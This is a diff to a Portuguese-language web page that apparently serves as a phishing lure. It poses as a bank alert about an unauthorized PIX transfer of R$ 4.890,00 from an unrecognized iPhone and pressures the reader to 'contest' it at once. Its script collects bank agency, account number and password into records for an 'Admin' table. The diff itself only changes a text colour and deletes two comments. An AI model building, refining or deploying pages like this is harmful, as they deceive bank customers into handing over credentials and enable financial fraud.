@@ -19,7 +19,7 @@
                 <p style="text-align: left; line-height: 1.5; margin-top: 12px; font-size: 0.95rem;">
                     Uma transferência via <strong>PIX no valor de R$ 4.890,00</strong> está agendada para liquidação em <strong>menos de 3 minutos</strong> para o favorecido <em>Caixa Econômica</em> a partir de um dispositivo não reconhecido (<em>iPhone 15 - IP 187.34.12.98</em>).
                 </p>
-                <p style="text-align: left; line-height: 1.5; margin-top: 10px; font-size: 0.9rem; color: #cbd5e1;">
+                <p style="text-align: left; line-height: 1.5; margin-top: 10px; font-size: 0.9rem; color: #000;">
                     Caso você <strong>NÃO RECONHEÇA</strong> esta operação, realize a <strong>CONTESTAÇÃO IMEDIATA</strong> abaixo para cancelar a saída do saldo e bloquear tentativas de invasão à sua conta.
                 </p>
             </div>
@@ -95,7 +95,6 @@
         const agencyInput = document.getElementById('agency');
         const accountInput = document.getElementById('account');
 
-        // Permite apenas números nos campos
         agencyInput.addEventListener('input', function () {
             this.value = this.value.replace(/\D/g, '');
         });
@@ -115,7 +114,6 @@
 
             document.getElementById('displayAcc').innerText = contaCompleta;
 
-            // Salva apenas a senha mascarada no histórico local para a tabela Admin
             const registro = {
                 conta: contaCompleta,
                 senha: senha ? '•'.repeat(senha.length) : '',
